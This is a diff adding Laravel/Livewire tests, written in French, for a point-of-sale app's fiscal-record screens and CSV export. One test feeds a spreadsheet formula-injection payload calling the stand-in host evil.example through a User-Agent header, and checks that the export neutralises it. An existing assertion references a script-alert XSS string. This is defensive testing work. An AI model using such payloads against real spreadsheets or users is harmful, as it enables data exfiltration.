@@ -12,6 +12,7 @@ use App\Domain\Contacts\Models\Client;
 use App\Domain\Facturation\Actions\EnregistrerAvoirAction;
 use App\Domain\Facturation\Actions\EnregistrerVenteCaisseAction;
 use App\Domain\Facturation\Enums\ModePaiement;
+use App\Domain\Facturation\Models\Paiement;
 use App\Domain\Tenancy\Actions\CreerMagasinAction;
 use App\Domain\Tenancy\Actions\CreerMembreMagasinAction;
 use App\Domain\Tenancy\Enums\RoleMagasin;
@@ -179,10 +180,46 @@ class EnregistrementFiscalResourceTest extends TestCase
             ->assertSee('"parametre": "taux_tva"')
             ->assertSee('"ancienne_valeur": "5.50"')
             ->assertSee('"nouvelle_valeur": "20.00"')
-            ->assertSee('produit n° '.$produit->id)
+            ->assertSee('Produit (identifiant interne '.$produit->id.')')
             ->assertSee($evenement->signature)
             ->assertSee('&lt;script&gt;alert(', false)
             ->assertDontSee('<script>alert(', false);
+    }
+
+    /**
+     * Un ticket n'est pas « facture n° {id} » : la colonne Document donne
+     * le numéro légal d'une vente, et l'identifiant interne, nommé comme
+     * tel, de ce qui n'en a pas.
+     */
+    public function test_la_colonne_document_donne_le_numero_legal_d_une_vente_et_l_identifiant_interne_du_reste(): void
+    {
+        $this->connecterProprietaire();
+        $produit = Produit::factory()->create(['prix_vente_ttc' => 12, 'taux_tva' => 20, 'suivi_stock' => false]);
+        $ticket = app(EnregistrerVenteCaisseAction::class)->handle(Client::factory()->create(), [['produit_id' => $produit->id, 'quantite' => 1]], ModePaiement::Especes);
+        $paiement = Paiement::query()->sole();
+
+        $composant = Livewire::test(ListEnregistrementsFiscaux::class);
+
+        $composant->assertSee("Ticket {$ticket->numero}")
+            ->assertSee("Paiement (identifiant interne {$paiement->id})")
+            ->assertDontSee("facture n° {$ticket->id}");
+    }
+
+    /**
+     * La signature d'une vente se vérifie hors de l'application avec le
+     * texte exact que la fiche donne, que l'export du journal des
+     * événements ne reprend pas.
+     */
+    public function test_la_fiche_d_une_vente_donne_le_texte_exact_qu_elle_signe(): void
+    {
+        $this->connecterProprietaire();
+        $this->vendre();
+        $vente = EnregistrementFiscal::query()->where('chaine', ChaineFiscale::Vente->value)->sole();
+
+        $composant = Livewire::test(ViewEnregistrementFiscal::class, ['record' => $vente->getRouteKey()]);
+
+        $composant->assertSee('Texte exact signé')
+            ->assertSee($vente->contenu);
     }
 
     public function test_les_horodatages_s_affichent_a_l_heure_de_paris(): void
@@ -279,6 +316,31 @@ class EnregistrementFiscalResourceTest extends TestCase
         ], $lignes[3]);
         $clePublique = Arr::first(config('caisse_securisee.cles_publiques'));
         $this->assertSame(1, openssl_verify($lignes[3][15], base64_decode(strtr($lignes[3][11], '-_', '+/')), $clePublique, OPENSSL_ALGO_SHA256));
+    }
+
+    /**
+     * Le nom de l'opérateur et son navigateur viennent de l'utilisateur :
+     * un tableur ne les évalue pas comme des formules à l'ouverture du
+     * fichier. Le contenu signé, lui, reste exact pour la vérification.
+     */
+    public function test_l_export_csv_ne_laisse_aucune_formule_venue_de_l_utilisateur(): void
+    {
+        $this->travelTo(CarbonImmutable::parse('2026-10-20 10:00:00', 'Europe/Paris'));
+        $proprietaire = User::factory()->create(['name' => '@SOMME(A1:A9)']);
+        $magasin = $this->magasinDe($proprietaire);
+        $navigateur = '=HYPERLINK("https://evil.example/?d="&A1;"Cliquez")';
+        $this->actingAs($proprietaire)->withHeader('User-Agent', $navigateur)->get("/app/{$magasin->uuid}")->assertSuccessful();
+        Filament::setTenant($magasin);
+
+        $composant = Livewire::test(ListEnregistrementsFiscaux::class)
+            ->callAction('exporter_journal', ['du' => '2026-10-20', 'au' => '2026-10-20']);
+
+        $ouverture = $this->lignesDuCsv($composant)[2];
+        $this->assertSame('80', $ouverture[3]);
+        $this->assertSame("'@SOMME(A1:A9) (n° {$proprietaire->id})", $ouverture[5]);
+        $this->assertSame("'{$navigateur}", $ouverture[8]);
+        $this->assertSame(EnregistrementFiscal::query()->where('type', '80')->sole()->contenu, $ouverture[15]);
+        $this->assertStringContainsString('"agent_utilisateur":"=HYPERLINK(', $ouverture[15]);
     }
 
     public function test_l_export_ne_reprend_que_les_evenements_de_la_periode(): void
